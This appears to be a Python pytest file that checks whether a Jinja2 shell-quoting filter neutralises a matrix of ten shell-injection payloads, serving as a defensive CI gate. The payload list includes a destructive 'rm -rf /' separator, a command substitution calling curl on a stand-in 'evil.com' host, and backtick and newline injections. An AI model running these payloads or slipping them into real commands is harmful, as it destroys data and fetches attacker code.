"""Shell injection payload matrix — locks the loader/runner safety invariant.

The loader's job is to reject string / array(string-items) parameters that
DON'T flow through ``| sh``. This file complements that contract by
validating the **other half** of the defense: when a value IS passed
through the Jinja2 ``sh`` filter (i.e. ``shlex.quote``), the rendered
command MUST NOT execute the injection payload as code regardless of how
exotic the payload is.

Each payload exercises a different shell-injection class — command
separators, command substitution, backticks, NUL byte truncation, newline
injection, RTL Unicode overrides, parameter expansion, embedded quotes,
and heredoc EOFs. The assertions verify that the rendered string is
literal text from the shell's POV: every dangerous character is either
absent (e.g. unbalanced quotes that would have opened a string get
escaped) or wrapped inside single quotes that shell can't interpret.

This is the shell-injection acceptance test + CI gate referenced in
spec §需求:shell 注入 payload 矩阵 CI gate.
"""

from __future__ import annotations

import shlex

import jinja2
import pytest

# --------------------------------------------------------------------------- #
# Jinja2 environment with the same `sh` filter the runner uses
# --------------------------------------------------------------------------- #


def _sh_filter(value: object) -> str:
    """Mirror of the runner's `sh` filter — `shlex.quote(str(value))`.

    The runner-side ``_sh_filter`` MUST stay identical to this; if it
    ever diverges, the loader's static rejection of unquoted parameters
    is meaningless. The injection matrix asserts this filter produces
    safe-by-shell-eval text for the 10 payload classes below.
    """

    return shlex.quote(str(value))


def _make_env() -> jinja2.Environment:
    env = jinja2.Environment(autoescape=False)
    env.filters["sh"] = _sh_filter
    return env


def _render(template: str, **values: object) -> str:
    env = _make_env()
    return env.from_string(template).render(**values)


# --------------------------------------------------------------------------- #
# Payload matrix — each entry is (label, payload, danger_substrings)
# --------------------------------------------------------------------------- #
#
# `danger_substrings` is a list of substrings that, if found *unquoted* in
# the rendered command, would mean shell evaluation could execute them.
# The assertions verify that EITHER:
#   - the substring is fully wrapped inside a `'...'` single-quoted block
#     (shell guarantees no substitution / no special-char eval inside ''),
#   - or the substring is `shlex.quote`-escaped into a form shell reads as
#     literal characters.
#
# We test the second invariant via a strict structural property: the
# rendered output starts and ends with a single quote, contains every byte
# of the payload between those quotes (except embedded `'` which gets
# escaped to `'\''`), and no naked dangerous metacharacters appear OUTSIDE
# of single-quoted blocks.


PAYLOADS: list[tuple[str, str]] = [
    ("command_separator_with_rm", "'; rm -rf /; #"),
    ("command_substitution", "$(curl evil.com)"),
    ("backticks_whoami", "`whoami`"),
    ("nul_byte", "abc\x00def"),
    ("newline_injection", "host\n; payload"),
    # Right-to-Left override character (U+202E) — a common Unicode trick.
    ("rtl_override", "abc‮dcba"),
    ("parameter_expansion", "${PATH:0:1}"),
    ("single_quote_embed", "abc'def"),
    ("double_quote_embed", 'abc"def$(evil)"end'),
    ("heredoc_eof", "<<EOF\npayload\nEOF"),
]


def _is_inside_single_quotes(rendered: str) -> bool:
    """Return True iff ``rendered`` is a single shlex-quoted token.

    `shlex.quote` always produces either:
      - the original string verbatim if it's already safe (alphanumeric,
        no shell metacharacters), or
      - a single-quoted form `'...'` with embedded `'` escaped to `'\''`.

    For ALL 10 payloads above, at least one character is dangerous, so
    `shlex.quote` MUST produce the `'...'` form. We assert that the
    rendered output starts and ends with `'`.
    """

    return rendered.startswith("'") and rendered.endswith("'")


@pytest.mark.parametrize(
    "label,payload",
    PAYLOADS,
    ids=[label for label, _ in PAYLOADS],
)
def test_sh_filter_neutralises_injection(label: str, payload: str) -> None:
    """For each payload, the Jinja2 ``| sh`` filter must produce a
    shell-safe token: either the original string verbatim (if it had no
    metachars — but none of our payloads do) or a single-quoted token
    where every internal `'` is escaped to `'\''`.

    The assertion error message exposes both the original payload and
    the quoted result so a future regression is easy to debug.
    """

    rendered = _render("{{ x | sh }}", x=payload)

    assert _is_inside_single_quotes(rendered), (
        f"payload={label!r} produced rendered output that is NOT wrapped in "
        f"single quotes — shell injection risk.\n"
        f"  payload (repr): {payload!r}\n"
        f"  rendered (repr): {rendered!r}"
    )

    # Round-trip property: shlex split of the rendered single-quoted token
    # MUST yield exactly the payload back. This is the canonical
    # "no information loss, no extra eval" property for shlex.quote.
    tokens = shlex.split(rendered)
    assert tokens == [payload], (
        f"payload={label!r} round-trip failed.\n"
        f"  payload (repr): {payload!r}\n"
        f"  rendered (repr): {rendered!r}\n"
        f"  shlex.split result: {tokens!r}"
    )


@pytest.mark.parametrize(
    "label,payload",
    PAYLOADS,
    ids=[label for label, _ in PAYLOADS],
)
def test_sh_filter_inside_command_neutralises_injection(label: str, payload: str) -> None:
    """Same payload matrix, but exercised through a realistic command
    template (``ping {{ x | sh }}``) so the test asserts the safety
    invariant holds at the full-command rendering level — not just at the
    bare filter level.
    """

    rendered = _render("ping {{ x | sh }}", x=payload)

    # The rendered command must start with the literal `ping ` prefix and
    # the quoted payload must be the only thing after.
    assert rendered.startswith("ping "), (
        f"payload={label!r} command rendering missing prefix.\n  rendered (repr): {rendered!r}"
    )
    quoted_part = rendered[len("ping ") :]
    tokens = shlex.split(rendered)
    assert tokens == ["ping", payload], (
        f"payload={label!r} command round-trip failed.\n"
        f"  payload (repr): {payload!r}\n"
        f"  rendered (repr): {rendered!r}\n"
        f"  quoted portion (repr): {quoted_part!r}\n"
        f"  shlex.split result: {tokens!r}"
    )


def test_payload_matrix_minimum_count() -> None:
    """Spec §需求:shell 注入 payload 矩阵 CI gate requires ≥10 payloads.

    Pin the count so a future refactor that accidentally drops a payload
    fails this gate immediately rather than silently weakening the test
    matrix.
    """

    assert len(PAYLOADS) >= 10
